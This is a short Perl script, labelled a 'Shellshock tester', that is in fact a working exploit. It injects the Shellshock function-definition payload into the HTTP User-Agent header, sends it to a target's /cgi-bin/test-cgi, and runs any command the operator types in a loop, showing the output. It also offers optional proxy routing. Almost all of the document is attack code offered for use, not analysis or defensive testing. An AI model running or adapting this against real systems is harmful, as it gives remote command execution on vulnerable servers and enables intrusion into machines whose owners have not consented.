######################################
#Simple stripped down Shellshock tester
#Needs addional features adding.
#Usage perl <script name> <target ip>
#Author - Defnos
######################################

#!/usr/bin/perl

use LWP::Simple;
use LWP::UserAgent;

#User agent setup
my $ua = LWP::UserAgent->new;
$ua->timeout(5);
#$ua->proxy([qw( https http )], "<PROXY IP>:<PROXY PORT>/"); #Set useragent proxy, needs to be absolute url.

#Proxy authentication 
my $user = ""; #Add username and pass for proxy server if you have one.
my $pass = ""; #

my $cgi = "/cgi-bin/test-cgi/";
my $ip = "$ARGV[0]" if $ARGV[0];
my $cmd;

if(defined($ARGV[0]) && ($ARGV[0] eq "-h" || $ARGV[0] eq "-help"))
{
        print "Help file\r\n";
        exit;
}

if(!defined($ARGV[0]))
{	
	$tmp = "";
	while(!defined($ip))
	{
		print "\nPlease enter IP address to send command: ";
		$tmp = <>;
		chomp($tmp);
	
		if ($tmp =~ m/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)
		{
			$ip = $tmp;
		}
	}	 
}

#Command Loop############################################################
while($cmd ne "!end")
{
	print "\n\nPlease enter command to send: ";
	chomp($cmd = <STDIN>);
	exit if($cmd eq "!end"); #Termination of loop

#Perform the request
	$ua->agent("() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\n\";system(\"$cmd;\");'");
	
	my $url = "http://"."$ip"."/cgi-bin/test-cgi";

	print "\n\nSending request to $url - Please wait:";
	$req = HTTP::Request->new(GET => "$url");
	$req->header('Accept' => 'text/html');
	#$req->proxy_authorization_basic($user, $pass); #Enable if using proxy, why wouldnt you?
#Send request
	$res = $ua->request($req);
	
#Process outcome

		if($res->is_success)
		{
			print "\n\nRequest successful: ";
			print "\n" . "$ip >> \n" . $res->decoded_content . "\n";
		}
		else
		{
			#errors and stuff, probably needs some more details checks: - Defnos
			print "\n\nError: " . $res->status_line . "\n\n";
		}
}
exit 0;
